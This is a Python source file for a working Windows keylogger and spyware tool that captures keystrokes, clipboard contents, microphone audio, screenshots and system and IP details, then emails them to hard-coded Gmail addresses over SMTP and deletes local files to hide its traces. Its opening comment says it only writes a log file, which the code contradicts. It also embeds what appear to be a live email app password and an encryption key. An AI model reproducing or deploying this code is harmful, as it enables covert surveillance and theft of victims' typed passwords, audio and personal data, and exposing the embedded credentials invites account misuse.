# THIS FILE GENS A KEY_LOG.TXT FILE ONLY and appends details to it

#information of the system
import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get
#we are going to save a
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
import os
import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
# EMAIL IMPORTS BELOW

import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

# EMAIL IMPORTS

############################KEY LOGGER BELOW



keys_information = 'log.txt'
system_information = "sys.txt"
clipboard_information = "clipboard_pro.txt"
audio_information = "audio_pro.wav"
screenshot_information = "screenshot_pro.png"

keys_information_e = "e_log.txt"
system_information_e = "e_sys.txt"
clipboard_information_e = "e_clipboard.txt"
microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3
key = "lr-P4dNajeFXLopKXhy2nhXyHRLIsyyWu9-4IEZJcBE="


file_path = "C:\\Users\\Raymond\\PycharmProjects\\keylog"
extend = "\\"
file_merge = file_path + extend

smtp_port = 587
smtp_server = "smtp.gmail.com"

email_from = 'razyimond@gmail.com'
email_list = ['razyimond@gmail.com', 'mbithi@gmail.com']
pswd = 'mpqggrfvtmpkfskv'

username = getpass.getuser()

subject = "We got some details"


def sendText_emails(email_list,filename):
    for person in email_list:
        # the body of the email

        body = f"""
        line 1
        line 2
        line 3
        etc

            """

        # make a MIME object to define parts of the email

        msg = MIMEMultipart()
        msg['From'] = email_from
        msg['To'] = person
        msg['Subject'] = subject

        # attach the body of the message
        msg.attach(MIMEText(body, 'plain'))


        # we are attaching the csv file


        # open the file in python as binary
        attachment = open(filename, 'rb')  # we are reading in binary dummy

        # encode base 64
        attachment_package = MIMEBase('application', 'octet-stream')
        attachment_package.set_payload((attachment).read())
        encoders.encode_base64(attachment_package)
        attachment_package.add_header('Content-Disposition', "attachment; filename=" + filename)
        msg.attach(attachment_package)

        # cast it to a string
        text = msg.as_string()

        # Connect with the server
        print("Connexting to server...")
        TIE_server = smtplib.SMTP(smtp_server, smtp_port)
        TIE_server.starttls()
        TIE_server.login(email_from, pswd)
        print("Successfully conned to server")
        print()

        # send emails to "persons" as listed
        print(f"Sending email to {person}...")
        TIE_server.sendmail(email_from, person, text)
        print((f"Email sent to:{person}"))

    TIE_server.quit()


# sendText_emails(email_list,keys_information)

def computer_information():
    with open(file_path + extend + system_information, 'a')as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip =  get("https://api.ipify.org").text
            f.write("Public IP ADD: " + public_ip)
        except Exception:
            f.write("Could not get Public Ip add (might be max query)")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System:" + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n" )
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP ADD: " + IPAddr + "\n")

computer_information()


def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)


        except:
            f.write("Clipboard could not be copied")

copy_clipboard()


#getting the audio

def microphone():
    fs = 44100
    #the amount of time we aregoing to get on the microphone
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

#it is going to record for 10 secs
microphone()


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

#the execution of the screenshot
screenshot()

#keylogger below #keylogger below
number_of_iterations = 0
# GETTING THE TIME THE KEY LOGGER IS LAUNCHED
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []


    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        # we are going to increase the key count by 1
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        # we are going to be appending the press.txt file
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                # we are removing the '' when the keys are taken in
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        # below we are stopping the keylogger
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        # clear out the entire logs for the keys info
        with open(file_path + extend + keys_information, 'w')as f:
            f.write(" ")


        screenshot()
        # WE ARE GOING TO SEND THE SCREENSHOT INFO
        print('Screenshot file sent')
        sendText_emails(email_list,screenshot_information)

        file_enc = 'encryption_key.txt'
        sendText_emails(email_list,file_enc)
        print('The key has been sent')

        copy_clipboard()
        sendText_emails(email_list,clipboard_information)

        microphone()
        sendText_emails(email_list,audio_information)
        ###########################################################ADDED THE PART BELOW ##########################################

        with open(keys_information, 'rb')as keys:
            ficha = keys.read()

        f = Fernet(key)
        encryptical = f.encrypt(ficha)

        with open('enc.txt','wb') as enc:
            enc.write(encryptical)

        # WE ARE GOING TO SEND THE ENC FILE THAT GOT THE LOGS
        enc_file = 'enc.txt'
        sendText_emails(email_list,enc_file)
        print('The encrypted log file has been sent')
        ###########################################################ADDED THE PART ABOVE ##########################################

        number_of_iterations +=1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb')as f:
        data = f.read()



    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb')as f:
        f.write(encrypted)

    # WE HAVE BEEN ABLE TO SEND THE SPECIFIC FILES
    sendText_emails(email_list,encrypted_file_names[count])
    count += 1

time.sleep(120) # we will let it sleep for two mins

#clean up tracks and delete files
delete_files = [system_information, clipboard_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)


